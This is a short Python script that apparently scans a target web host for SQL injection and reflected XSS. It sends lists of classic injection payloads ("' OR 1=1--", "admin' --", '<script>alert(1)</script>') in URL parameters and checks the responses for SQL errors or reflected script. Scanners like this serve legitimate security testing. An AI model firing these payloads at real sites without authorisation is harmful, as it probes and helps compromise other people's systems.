import requests

def check_sqli(target, timeout=5):
    sqli_payloads = ["' OR '1'='1" , "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*" , "admin' --", "' OR ''='", "%27%20OR%201=1--" , "%22%20OR%20%221%22=%221"]
    vulnerable = False
    for payload in sqli_payloads:
        url = f"http://{target}/?id={payload}"
        try:
            r = requests.get(url, timeout=timeout)
            errors = ["You have an error in your SQL syntax", "Warning: mysql_", "unclosed quotation mark"]
            for error in errors:
                if error.lower() in r.text.lower():
                    vulnerable = True
                    return True
        except:
            continue
    return vulnerable

def check_xss(target, timeout=5):
    xss_payloads = ['<script>alert(1)</script>', '"><script>alert(1)</script>']
    vulnerable = False
    for payload in xss_payloads:
        url = f"http://{target}/?q={payload}"
        try:
            r = requests.get(url, timeout=timeout)
            if payload in r.text:
                vulnerable = True
                return True
        except:
            continue
    return vulnerable
